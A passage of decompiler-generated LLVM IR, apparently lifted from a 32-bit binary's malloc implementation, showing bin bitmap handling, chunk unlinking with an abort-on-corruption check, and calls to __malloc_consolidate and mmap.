  %v2_804bf45 = inttoptr i32 %v1_804bf45 to i32*
  %v3_804bf45 = load i32, i32* %v2_804bf45, align 4
  store i32 %v3_804bf45, i32* %ecx.global-to-local, align 4
  store i32 %v3_804bf45, i32* %ebx.global-to-local, align 4
  %v2_804bf50 = add i32 %v3_804bf45, 4
  %v3_804bf50 = inttoptr i32 %v2_804bf50 to i32*
  %v4_804bf50 = load i32, i32* %v3_804bf50, align 4
  %v10_804bf50 = icmp ult i32 %v1_804bf3c, %v4_804bf50
  br i1 %v10_804bf50, label %dec_label_pc_804bf41, label %dec_label_pc_804bf55

dec_label_pc_804bf55:                             ; preds = %dec_label_pc_804bf41, %dec_label_pc_804bf3a
  %v0_804bf55.lcssa = phi i32 [ %v3_804bf1f, %dec_label_pc_804bf3a ], [ %v3_804bf45, %dec_label_pc_804bf41 ]
  %v1_804bf55 = add i32 %v0_804bf55.lcssa, 12
  %v2_804bf55 = inttoptr i32 %v1_804bf55 to i32*
  %v3_804bf55 = load i32, i32* %v2_804bf55, align 4
  store i32 %v3_804bf55, i32* @ebx, align 4
  br label %dec_label_pc_804bf58

dec_label_pc_804bf58:                             ; preds = %dec_label_pc_804befe, %dec_label_pc_804bf2c, %dec_label_pc_804bf0f, %dec_label_pc_804bf55
  %v0_804bf58 = phi i32 [ %v0_804bf11, %dec_label_pc_804bf0f ], [ %v0_804bf11, %dec_label_pc_804bf55 ], [ %v0_804bf11, %dec_label_pc_804bf2c ], [ %v2_804bf00, %dec_label_pc_804befe ]
  %stack_var_-64.1 = phi i32 [ %v2_804bf18, %dec_label_pc_804bf0f ], [ %v0_804bf55.lcssa, %dec_label_pc_804bf55 ], [ %v2_804bf18, %dec_label_pc_804bf2c ], [ %v3_804bf0a, %dec_label_pc_804befe ]
  %v1_804bf5a = urem i32 %v0_804bf58, 32
  %v2_804bf5a = icmp eq i32 %v1_804bf5a, 0
  store i32 %v1_804bf5a, i32* %esi.global-to-local, align 4
  store i32 %v1_804bf5a, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804bf64 = sdiv i32 %v0_804bf58, 32
  store i32 %v2_804bf64, i32* %edx.global-to-local, align 4
  br i1 %v2_804bf5a, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804bf58
  %v5_804bf67 = shl i32 1, %v1_804bf5a
  store i32 %v5_804bf67, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804bf58, %bb
  %v5_804bf69 = phi i32 [ 1, %dec_label_pc_804bf58 ], [ %v5_804bf67, %bb ]
  %v1_804bf69 = mul nsw i32 %v2_804bf64, 4
  %v2_804bf69 = add i32 %v1_804bf69, ptrtoint (i32* @global_var_8056d74.347 to i32)
  %v3_804bf69 = inttoptr i32 %v2_804bf69 to i32*
  %v4_804bf69 = load i32, i32* %v3_804bf69, align 4
  %v6_804bf69 = or i32 %v4_804bf69, %v5_804bf69
  store i32 %v6_804bf69, i32* %v3_804bf69, align 4
  %v0_804bf70 = load i32, i32* @ebx, align 4
  %v1_804bf70 = load i32, i32* @ebp, align 4
  %v2_804bf70 = add i32 %v1_804bf70, 12
  %v3_804bf70 = inttoptr i32 %v2_804bf70 to i32*
  store i32 %v0_804bf70, i32* %v3_804bf70, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804bf77 = load i32, i32* @ebp, align 4
  %v2_804bf77 = add i32 %v1_804bf77, 8
  %v3_804bf77 = inttoptr i32 %v2_804bf77 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804bf77, align 4
  %v0_804bf7a = load i32, i32* @ebp, align 4
  %v1_804bf7a = load i32, i32* @ebx, align 4
  %v2_804bf7a = add i32 %v1_804bf7a, 8
  %v3_804bf7a = inttoptr i32 %v2_804bf7a to i32*
  store i32 %v0_804bf7a, i32* %v3_804bf7a, align 4
  %v0_804bf7d = load i32, i32* @ebp, align 4
  %v1_804bf7d = load i32, i32* @esi, align 4
  %v2_804bf7d = add i32 %v1_804bf7d, 12
  %v3_804bf7d = inttoptr i32 %v2_804bf7d to i32*
  store i32 %v0_804bf7d, i32* %v3_804bf7d, align 4
  %v0_804bf80 = load i32, i32* @global_var_8056a80.346, align 128
  store i32 %v0_804bf80, i32* @ebp, align 4
  %v9_804bf86 = icmp eq i32 %v0_804bf80, 134572660
  %v1_804bf8c = icmp eq i1 %v9_804bf86, false
  br i1 %v1_804bf8c, label %dec_label_pc_804beaf, label %dec_label_pc_804bf92

dec_label_pc_804bf92:                             ; preds = %bb84, %dec_label_pc_804bf80.preheader
  br i1 %v8_804be43, label %dec_label_pc_804c020, label %dec_label_pc_804bfa0

dec_label_pc_804bfa0:                             ; preds = %dec_label_pc_804bf92
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804bfa4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804bfa4 = add i32 %v1_804bfa4, ptrtoint (i32* @global_var_8056a6c.343 to i32)
  store i32 %v2_804bfa4, i32* %edx.global-to-local, align 4
  %v1_804bfab = add i32 %v1_804bfa4, add (i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), i32 12)
  %v2_804bfab = inttoptr i32 %v1_804bfab to i32*
  %storemerge1.pre = load i32, i32* %v2_804bfab, align 4
  br label %dec_label_pc_804c01c

dec_label_pc_804bfb0:                             ; preds = %dec_label_pc_804c01c
  %v1_804bfb0 = add i32 %v4_804bfc7, 4
  %v2_804bfb0 = inttoptr i32 %v1_804bfb0 to i32*
  %v3_804bfb0 = load i32, i32* %v2_804bfb0, align 4
  store i32 %v3_804bfb0, i32* %ebx.global-to-local, align 4
  %v1_804bfb3 = add i32 %v4_804bfc7, 12
  %v2_804bfb3 = inttoptr i32 %v1_804bfb3 to i32*
  %v3_804bfb3 = load i32, i32* %v2_804bfb3, align 4
  store i32 %v3_804bfb3, i32* @ecx, align 4
  %v1_804bfb6 = and i32 %v3_804bfb0, -4
  store i32 %v1_804bfb6, i32* @ebx, align 4
  %v10_804bfb9 = icmp ult i32 %v1_804bfb6, %v1_804c192
  br i1 %v10_804bfb9, label %dec_label_pc_804c01c, label %dec_label_pc_804bfbf

dec_label_pc_804bfbf:                             ; preds = %dec_label_pc_804bfb0
  %v1_804bfbf = add i32 %v4_804bfc7, 8
  %v2_804bfbf = inttoptr i32 %v1_804bfbf to i32*
  %v3_804bfbf = load i32, i32* %v2_804bfbf, align 4
  store i32 %v3_804bfbf, i32* @edx, align 4
  %v1_804bfc2 = add i32 %v3_804bfbf, 12
  %v2_804bfc2 = inttoptr i32 %v1_804bfc2 to i32*
  %v3_804bfc2 = load i32, i32* %v2_804bfc2, align 4
  %v15_804bfc2 = icmp eq i32 %v3_804bfc2, %v4_804bfc7
  %v1_804bfc5 = icmp eq i1 %v15_804bfc2, false
  br i1 %v1_804bfc5, label %dec_label_pc_804bfcc, label %dec_label_pc_804bfc7

dec_label_pc_804bfc7:                             ; preds = %dec_label_pc_804bfbf
  %v1_804bfc7 = add i32 %v3_804bfb3, 8
  %v2_804bfc7 = inttoptr i32 %v1_804bfc7 to i32*
  %v3_804bfc7 = load i32, i32* %v2_804bfc7, align 4
  %v15_804bfc7 = icmp eq i32 %v3_804bfc7, %v4_804bfc7
  br i1 %v15_804bfc7, label %dec_label_pc_804bfd1, label %dec_label_pc_804bfcc

dec_label_pc_804bfcc:                             ; preds = %dec_label_pc_804bfc7, %dec_label_pc_804bfbf
  %v0_804bfcc = call i32 @abort()
  store i32 %v0_804bfcc, i32* %eax.global-to-local, align 4
  %v0_804bfd1.pre = load i32, i32* @ebx, align 4
  %v0_804bfd7.pre = load i32, i32* @ecx, align 4
  %v1_804bfd7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bfd1

dec_label_pc_804bfd1:                             ; preds = %dec_label_pc_804bfc7, %dec_label_pc_804bfcc
  %v1_804bfd7 = phi i32 [ %v3_804bfbf, %dec_label_pc_804bfc7 ], [ %v1_804bfd7.pre, %dec_label_pc_804bfcc ]
  %v0_804bfd7 = phi i32 [ %v3_804bfb3, %dec_label_pc_804bfc7 ], [ %v0_804bfd7.pre, %dec_label_pc_804bfcc ]
  %v0_804bfd1 = phi i32 [ %v1_804bfb6, %dec_label_pc_804bfc7 ], [ %v0_804bfd1.pre, %dec_label_pc_804bfcc ]
  %v5_804bfd3 = sub i32 %v0_804bfd1, %v1_804c192
  store i32 %v5_804bfd3, i32* %esi.global-to-local, align 4
  %v2_804bfd7 = add i32 %v1_804bfd7, 12
  %v3_804bfd7 = inttoptr i32 %v2_804bfd7 to i32*
  store i32 %v0_804bfd7, i32* %v3_804bfd7, align 4
  %v0_804bfda = load i32, i32* @edx, align 4
  %v1_804bfda = load i32, i32* @ecx, align 4
  %v2_804bfda = add i32 %v1_804bfda, 8
  %v3_804bfda = inttoptr i32 %v2_804bfda to i32*
  store i32 %v0_804bfda, i32* %v3_804bfda, align 4
  %v0_804bfdd = load i32, i32* %esi.global-to-local, align 4
  %v0_804bfe0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bfe0 = add i32 %v0_804bfe0, 8
  store i32 %v1_804bfe0, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804bfdd, 16
  br i1 %tmp127, label %dec_label_pc_804c4e1, label %dec_label_pc_804bfe9

dec_label_pc_804bfe9:                             ; preds = %dec_label_pc_804bfd1
  %v2_804bfed = add i32 %v0_804bfe0, %v1_804c192
  store i32 %v2_804bfed, i32* @edx, align 4
  %v1_804bff0 = or i32 %v1_804c192, 1
  store i32 %v1_804bff0, i32* %ebx.global-to-local, align 4
  %v2_804bff3 = add i32 %v0_804bfe0, 4
  %v3_804bff3 = inttoptr i32 %v2_804bff3 to i32*
  store i32 %v1_804bff0, i32* %v3_804bff3, align 4
  %v0_804bff6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bff8 = or i32 %v0_804bff6, 1
  store i32 %v1_804bff8, i32* %eax.global-to-local, align 4
  %v0_804bffb = load i32, i32* @edx, align 4
  %v1_804bffb = load i32, i32* @ebp, align 4
  %v2_804bffb = add i32 %v1_804bffb, 8
  %v3_804bffb = inttoptr i32 %v2_804bffb to i32*
  store i32 %v0_804bffb, i32* %v3_804bffb, align 4
  %v0_804bffe = load i32, i32* @edx, align 4
  %v1_804bffe = load i32, i32* @ebp, align 4
  %v2_804bffe = add i32 %v1_804bffe, 12
  %v3_804bffe = inttoptr i32 %v2_804bffe to i32*
  store i32 %v0_804bffe, i32* %v3_804bffe, align 4
  %v0_804c001 = load i32, i32* @edx, align 4
  %v1_804c001 = add i32 %v0_804c001, 8
  %v2_804c001 = inttoptr i32 %v1_804c001 to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c001, align 4
  %v0_804c008 = load i32, i32* @edx, align 4
  %v1_804c008 = add i32 %v0_804c008, 12
  %v2_804c008 = inttoptr i32 %v1_804c008 to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c008, align 4
  %v0_804c00f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c00f = load i32, i32* @edx, align 4
  %v2_804c00f = add i32 %v1_804c00f, 4
  %v3_804c00f = inttoptr i32 %v2_804c00f to i32*
  store i32 %v0_804c00f, i32* %v3_804c00f, align 4
  %v0_804c012 = load i32, i32* %esi.global-to-local, align 4
  %v1_804c012 = load i32, i32* @edx, align 4
  %v3_804c012 = add i32 %v1_804c012, %v0_804c012
  %v4_804c012 = inttoptr i32 %v3_804c012 to i32*
  store i32 %v0_804c012, i32* %v4_804c012, align 4
  br label %dec_label_pc_804c4e6

dec_label_pc_804c01c:                             ; preds = %dec_label_pc_804bfb0, %dec_label_pc_804bfa0
  %v4_804bfc7 = phi i32 [ %storemerge1.pre, %dec_label_pc_804bfa0 ], [ %v3_804bfb3, %dec_label_pc_804bfb0 ]
  store i32 %v4_804bfc7, i32* %eax.global-to-local, align 4
  %v12_804c01c = icmp eq i32 %v4_804bfc7, %v2_804bfa4
  %v1_804c01e = icmp eq i1 %v12_804c01c, false
  br i1 %v1_804c01e, label %dec_label_pc_804bfb0, label %dec_label_pc_804c020.loopexit

dec_label_pc_804c020.loopexit:                    ; preds = %dec_label_pc_804c01c
  br label %dec_label_pc_804c020

dec_label_pc_804c020:                             ; preds = %dec_label_pc_804c020.loopexit, %dec_label_pc_804bf92
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804c029 = add i32 %stack_var_-40.0.ph, 1
  %v2_804c02c = udiv i32 %v1_804c029, 32
  store i32 %v2_804c02c, i32* @edi, align 4
  %v1_804c02f = mul i32 %v1_804c029, 8
  %v2_804c02f = add i32 %v1_804c02f, ptrtoint (i32* @global_var_8056a6c.343 to i32)
  store i32 %v2_804c02f, i32* %ebx.global-to-local, align 4
  %v1_804c036 = urem i32 %v1_804c029, 32
  %v2_804c036 = icmp eq i32 %v1_804c036, 0
  store i32 %v1_804c036, i32* %ecx.global-to-local, align 4
  %v1_804c039 = mul nuw nsw i32 %v2_804c02c, 4
  %v2_804c039 = add i32 %v1_804c039, ptrtoint (i32* @global_var_8056d74.347 to i32)
  %v3_804c039 = inttoptr i32 %v2_804c039 to i32*
  %v4_804c039 = load i32, i32* %v3_804c039, align 4
  store i32 %v4_804c039, i32* %edx.global-to-local, align 4
  br i1 %v2_804c036, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804c020
  %v5_804c040 = shl i32 1, %v1_804c036
  store i32 %v5_804c040, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804c020, %bb85, %dec_label_pc_804c081
  %v1_804c042 = phi i32 [ %v1_804c042.pre, %dec_label_pc_804c081 ], [ %v4_804c039, %bb85 ], [ %v4_804c039, %dec_label_pc_804c020 ]
  %v0_804c046 = phi i32 [ %v0_804c042.pre, %dec_label_pc_804c081 ], [ %v5_804c040, %bb85 ], [ 1, %dec_label_pc_804c020 ]
  %tmp86 = icmp ule i32 %v0_804c046, %v1_804c042
  %v1_804c046 = icmp eq i32 %v0_804c046, 0
  %v1_804c048 = icmp eq i1 %v1_804c046, false
  %or.cond = and i1 %tmp86, %v1_804c048
  br i1 %or.cond, label %dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge, label %dec_label_pc_804c04a.preheader

dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge: ; preds = %.preheader
  %v0_804c07112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c076.preheader

dec_label_pc_804c04a.preheader:                   ; preds = %.preheader
  %v0_804c04a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c04a

dec_label_pc_804c04a:                             ; preds = %dec_label_pc_804c04a.preheader, %dec_label_pc_804c054
  %v0_804c04a = phi i32 [ %v0_804c04a.pre, %dec_label_pc_804c04a.preheader ], [ %v1_804c04a, %dec_label_pc_804c054 ]
  %v1_804c04a = add i32 %v0_804c04a, 1
  store i32 %v1_804c04a, i32* @edi, align 4
  %v6_804c04e = icmp ugt i32 %v1_804c04a, 2
  br i1 %v6_804c04e, label %dec_label_pc_804c0fd.loopexit, label %dec_label_pc_804c054

dec_label_pc_804c054:                             ; preds = %dec_label_pc_804c04a
  %v1_804c054 = mul i32 %v1_804c04a, 4
  %v2_804c054 = add i32 %v1_804c054, ptrtoint (i32* @global_var_8056d74.347 to i32)
  %v3_804c054 = inttoptr i32 %v2_804c054 to i32*
  %v4_804c054 = load i32, i32* %v3_804c054, align 4
  store i32 %v4_804c054, i32* %edx.global-to-local, align 4
  %v1_804c05b = icmp eq i32 %v4_804c054, 0
  br i1 %v1_804c05b, label %dec_label_pc_804c04a, label %dec_label_pc_804c05f

dec_label_pc_804c05f:                             ; preds = %dec_label_pc_804c054
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804c066 = mul i32 %v1_804c04a, 256
  store i32 %v2_804c066, i32* %eax.global-to-local, align 4
  %v1_804c069 = add i32 %v2_804c066, ptrtoint (i32* @global_var_8056a6c.343 to i32)
  store i32 %v1_804c069, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c076.preheader

dec_label_pc_804c076.preheader:                   ; preds = %dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge, %dec_label_pc_804c05f
  %v0_804c07112 = phi i32 [ %v1_804c069, %dec_label_pc_804c05f ], [ %v0_804c07112.pre, %dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804c05f ], [ %v0_804c046, %dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge ]
  %v0_804c088 = phi i32 [ %v4_804c054, %dec_label_pc_804c05f ], [ %v1_804c042, %dec_label_pc_804c046.dec_label_pc_804c076.preheader_crit_edge ]
  %v2_804c0764 = and i32 %v0_804c088, %esi.promoted
  %v3_804c0765 = icmp eq i32 %v2_804c0764, 0
  br i1 %v3_804c0765, label %dec_label_pc_804c071, label %dec_label_pc_804c07a

dec_label_pc_804c071:                             ; preds = %dec_label_pc_804c076.preheader, %dec_label_pc_804c071
  %v2_804c07414 = phi i32 [ %v2_804c074, %dec_label_pc_804c071 ], [ %esi.promoted, %dec_label_pc_804c076.preheader ]
  %v0_804c07113 = phi i32 [ %v1_804c071, %dec_label_pc_804c071 ], [ %v0_804c07112, %dec_label_pc_804c076.preheader ]
  %v1_804c071 = add i32 %v0_804c07113, 8
  %v2_804c074 = mul i32 %v2_804c07414, 2
  %v2_804c076 = and i32 %v2_804c074, %v0_804c088
  %v3_804c076 = icmp eq i32 %v2_804c076, 0
  br i1 %v3_804c076, label %dec_label_pc_804c071, label %dec_label_pc_804c076.dec_label_pc_804c07a_crit_edge

dec_label_pc_804c076.dec_label_pc_804c07a_crit_edge: ; preds = %dec_label_pc_804c071
  store i32 %v1_804c071, i32* %ebx.global-to-local, align 4
  store i32 %v2_804c074, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c07a

dec_label_pc_804c07a:                             ; preds = %dec_label_pc_804c076.dec_label_pc_804c07a_crit_edge, %dec_label_pc_804c076.preheader
  %v0_804c08a = phi i32 [ %v2_804c074, %dec_label_pc_804c076.dec_label_pc_804c07a_crit_edge ], [ %esi.promoted, %dec_label_pc_804c076.preheader ]
  %v1_804c0a4 = phi i32 [ %v1_804c071, %dec_label_pc_804c076.dec_label_pc_804c07a_crit_edge ], [ %v0_804c07112, %dec_label_pc_804c076.preheader ]
  %v1_804c07a = add i32 %v1_804c0a4, 12
  %v2_804c07a = inttoptr i32 %v1_804c07a to i32*
  %v3_804c07a = load i32, i32* %v2_804c07a, align 4
  store i32 %v3_804c07a, i32* @ecx, align 4
  %v12_804c07d = icmp eq i32 %v3_804c07a, %v1_804c0a4
  %v1_804c07f = icmp eq i1 %v12_804c07d, false
  br i1 %v1_804c07f, label %dec_label_pc_804c095, label %dec_label_pc_804c081

dec_label_pc_804c081:                             ; preds = %dec_label_pc_804c07a
  %v1_804c083 = add i32 %v3_804c07a, 8
  store i32 %v1_804c083, i32* %ebx.global-to-local, align 4
  %v1_804c086 = sub i32 -1, %v0_804c08a
  store i32 %v1_804c086, i32* %eax.global-to-local, align 4
  %v2_804c088 = and i32 %v0_804c088, %v1_804c086
  store i32 %v2_804c088, i32* %edx.global-to-local, align 4
  %v2_804c08a = mul i32 %v0_804c08a, 2
  store i32 %v2_804c08a, i32* %esi.global-to-local, align 4
  %v1_804c08c = load i32, i32* @edi, align 4
  %v2_804c08c = mul i32 %v1_804c08c, 4
  %v3_804c08c = add i32 %v2_804c08c, ptrtoint (i32* @global_var_8056d74.347 to i32)
  %v4_804c08c = inttoptr i32 %v3_804c08c to i32*
  store i32 %v2_804c088, i32* %v4_804c08c, align 4
  %v0_804c042.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c042.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804c095:                             ; preds = %dec_label_pc_804c07a
  %v1_804c095 = add i32 %v3_804c07a, 4
  %v2_804c095 = inttoptr i32 %v1_804c095 to i32*
  %v3_804c095 = load i32, i32* %v2_804c095, align 4
  store i32 %v3_804c095, i32* %edx.global-to-local, align 4
  %v1_804c098 = add i32 %v3_804c07a, 12
  %v2_804c098 = inttoptr i32 %v1_804c098 to i32*
  %v3_804c098 = load i32, i32* %v2_804c098, align 4
  store i32 %v3_804c098, i32* %eax.global-to-local, align 4
  %v1_804c09b = and i32 %v3_804c095, -4
  store i32 %v1_804c09b, i32* @edx, align 4
  %v5_804c0a0 = sub i32 %v1_804c09b, %v1_804c192
  store i32 %v5_804c0a0, i32* %esi.global-to-local, align 4
  store i32 %v3_804c098, i32* %v2_804c07a, align 4
  %v0_804c0a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0a7 = add i32 %v1_804c0a7, 8
  %v3_804c0a7 = inttoptr i32 %v2_804c0a7 to i32*
  store i32 %v0_804c0a7, i32* %v3_804c0a7, align 4
  %v0_804c0aa = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804c0aa, 16
  br i1 %tmp128, label %dec_label_pc_804c0af, label %dec_label_pc_804c0b6

dec_label_pc_804c0af:                             ; preds = %dec_label_pc_804c095
  %v0_804c0af = load i32, i32* @ecx, align 4
  %v1_804c0af = load i32, i32* @edx, align 4
  %v2_804c0af = add i32 %v0_804c0af, 4
  %v3_804c0af = add i32 %v2_804c0af, %v1_804c0af
  %v4_804c0af = inttoptr i32 %v3_804c0af to i32*
  %v5_804c0af = load i32, i32* %v4_804c0af, align 4
  %v6_804c0af = or i32 %v5_804c0af, 1
  store i32 %v6_804c0af, i32* %v4_804c0af, align 4
  br label %dec_label_pc_804c0f5

dec_label_pc_804c0b6:                             ; preds = %dec_label_pc_804c095
  store i32 %v1_804c192, i32* %eax.global-to-local, align 4
  %v0_804c0bf = load i32, i32* @ecx, align 4
  %v2_804c0bf = add i32 %v0_804c0bf, %v1_804c192
  store i32 %v2_804c0bf, i32* @edx, align 4
  %v1_804c0c2 = load i32, i32* @ebp, align 4
  %v2_804c0c2 = add i32 %v1_804c0c2, 8
  %v3_804c0c2 = inttoptr i32 %v2_804c0c2 to i32*
  store i32 %v2_804c0bf, i32* %v3_804c0c2, align 4
  %v0_804c0c5 = load i32, i32* @edx, align 4
  %v1_804c0c5 = load i32, i32* @ebp, align 4
  %v2_804c0c5 = add i32 %v1_804c0c5, 12
  %v3_804c0c5 = inttoptr i32 %v2_804c0c5 to i32*
  store i32 %v0_804c0c5, i32* %v3_804c0c5, align 4
  %v0_804c0c8 = load i32, i32* @edx, align 4
  %v1_804c0c8 = add i32 %v0_804c0c8, 8
  %v2_804c0c8 = inttoptr i32 %v1_804c0c8 to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c0c8, align 4
  %v0_804c0cf = load i32, i32* @edx, align 4
  %v1_804c0cf = add i32 %v0_804c0cf, 12
  %v2_804c0cf = inttoptr i32 %v1_804c0cf to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v2_804c0cf, align 4
  br i1 %v6_804be4b, label %dec_label_pc_804c0de, label %dec_label_pc_804c0d8

dec_label_pc_804c0d8:                             ; preds = %dec_label_pc_804c0b6
  %v0_804c0d8 = load i32, i32* @edx, align 4
  store i32 %v0_804c0d8, i32* @global_var_8056a70.344, align 16
  br label %dec_label_pc_804c0de

dec_label_pc_804c0de:                             ; preds = %dec_label_pc_804c0b6, %dec_label_pc_804c0d8
  %v4_804c0de = or i32 %v1_804c192, 1
  %v0_804c0e3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804c0de, i32* %ebx.global-to-local, align 4
  %v1_804c0e9 = or i32 %v0_804c0e3, 1
  store i32 %v1_804c0e9, i32* %eax.global-to-local, align 4
  %v1_804c0ec = load i32, i32* @ecx, align 4
  %v2_804c0ec = add i32 %v1_804c0ec, 4
  %v3_804c0ec = inttoptr i32 %v2_804c0ec to i32*
  store i32 %v4_804c0de, i32* %v3_804c0ec, align 4
  %v0_804c0ef = load i32, i32* %esi.global-to-local, align 4
  %v1_804c0ef = load i32, i32* @edx, align 4
  %v3_804c0ef = add i32 %v1_804c0ef, %v0_804c0ef
  %v4_804c0ef = inttoptr i32 %v3_804c0ef to i32*
  store i32 %v0_804c0ef, i32* %v4_804c0ef, align 4
  %v0_804c0f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0f2 = load i32, i32* @edx, align 4
  %v2_804c0f2 = add i32 %v1_804c0f2, 4
  %v3_804c0f2 = inttoptr i32 %v2_804c0f2 to i32*
  store i32 %v0_804c0f2, i32* %v3_804c0f2, align 4
  br label %dec_label_pc_804c0f5

dec_label_pc_804c0f5:                             ; preds = %dec_label_pc_804c0af, %dec_label_pc_804c0de
  %v0_804c0f5 = load i32, i32* @ecx, align 4
  %v1_804c0f5 = add i32 %v0_804c0f5, 8
  store i32 %v1_804c0f5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c0fd.loopexit:                    ; preds = %dec_label_pc_804c04a
  br label %dec_label_pc_804c0fd

dec_label_pc_804c0fd:                             ; preds = %dec_label_pc_804c0fd.loopexit, %dec_label_pc_804be05, %dec_label_pc_804be0d
  %v0_804c0fd = load i32, i32* @global_var_8056a6c.343, align 4
  store i32 %v0_804c0fd, i32* @ebx, align 4
  %v1_804c107 = add i32 %v1_804c192, 16
  store i32 %v1_804c107, i32* @esi, align 4
  %v1_804c10a = add i32 %v0_804c0fd, 4
  %v2_804c10a = inttoptr i32 %v1_804c10a to i32*
  %v3_804c10a = load i32, i32* %v2_804c10a, align 4
  %v1_804c111 = and i32 %v3_804c10a, -4
  store i32 %v1_804c111, i32* %ecx.global-to-local, align 4
  %v7_804c114 = icmp ult i32 %v1_804c111, %v1_804c107
  br i1 %v7_804c114, label %dec_label_pc_804c134, label %dec_label_pc_804c118

dec_label_pc_804c118:                             ; preds = %dec_label_pc_804c0fd
  %v2_804c11c = add i32 %v0_804c0fd, %v1_804c192
  store i32 %v2_804c11c, i32* @edx, align 4
  %v1_804c11f = or i32 %v1_804c192, 1
  store i32 %v1_804c11f, i32* %eax.global-to-local, align 4
  store i32 %v2_804c11c, i32* @global_var_8056a6c.343, align 4
  store i32 %v1_804c11f, i32* %v2_804c10a, align 4
  %v0_804c12b = load i32, i32* %ecx.global-to-local, align 4
  %v5_804c12b = sub i32 %v0_804c12b, %v1_804c192
  store i32 %v5_804c12b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c487

dec_label_pc_804c134:                             ; preds = %dec_label_pc_804c0fd
  %v0_804c134 = load i32, i32* @global_var_8056d9c.348, align 4
  store i32 %v0_804c134, i32* %edx.global-to-local, align 4
  %v0_804c13a = load i8, i8* @global_var_8056a40.342, align 64
  %v1_804c13a = and i8 %v0_804c13a, 2
  %v2_804c13a = icmp eq i8 %v1_804c13a, 0
  br i1 %v2_804c13a, label %dec_label_pc_804c168, label %dec_label_pc_804c143

dec_label_pc_804c143:                             ; preds = %dec_label_pc_804c134
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804c14b = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8056a40.342 to i32*))
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* @ebx, align 4
  %v1_804c155 = add i32 %v1_804c192, -7
  store i32 %v1_804c155, i32* %eax.global-to-local, align 4
  store i32 %v1_804c155, i32* %stack_var_-92, align 4
  %v1_804c159 = call i32 @malloc(i32 %v1_804c155)
  store i32 %v1_804c159, i32* %eax.global-to-local, align 4
  store i32 %v1_804c159, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c168:                             ; preds = %dec_label_pc_804c134
  %v1_804c168 = add i32 %v0_804c134, -1
  store i32 %v1_804c168, i32* @ecx, align 4
  store i32 %v1_804c192, i32* @ebx, align 4
  %v1_804c173 = load i32, i32* @global_var_8056d8c.349, align 4
  %v7_804c173 = icmp ult i32 %v1_804c192, %v1_804c173
  br i1 %v7_804c173, label %dec_label_pc_804c235, label %dec_label_pc_804c17f

dec_label_pc_804c17f:                             ; preds = %dec_label_pc_804c168
  %v0_804c17f = load i32, i32* @global_var_8056d90.350, align 16
  store i32 %v0_804c17f, i32* %eax.global-to-local, align 4
  %v1_804c184 = load i32, i32* @global_var_8056d94.351, align 4
  %v5_804c18a = icmp slt i32 %v0_804c17f, %v1_804c184
  br i1 %v5_804c18a, label %dec_label_pc_804c190, label %dec_label_pc_804c235

dec_label_pc_804c190:                             ; preds = %dec_label_pc_804c17f
  %v2_804c192 = add i32 %v1_804c192, 10
  %v3_804c192 = add i32 %v2_804c192, %v0_804c134
  %v1_804c196 = sub i32 0, %v0_804c134
  store i32 %v1_804c196, i32* %eax.global-to-local, align 4
  %v2_804c198 = and i32 %v3_804c192, %v1_804c196
  store i32 %v2_804c198, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804c198, %v1_804c192
  br i1 %tmp129, label %dec_label_pc_804c1a4, label %dec_label_pc_804c235

dec_label_pc_804c1a4:                             ; preds = %dec_label_pc_804c190
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804c1b1 = call i32 @mmap(i32 0, i32 %v2_804c198, i32 3, i32 34, i32 0, i32 0, i32 %v1_804c168, i32 %v1_804c168)
  store i32 %v8_804c1b1, i32* %eax.global-to-local, align 4
  store i32 %v8_804c1b1, i32* @edx, align 4
  %v10_804c1bb = icmp eq i32 %v8_804c1b1, -1
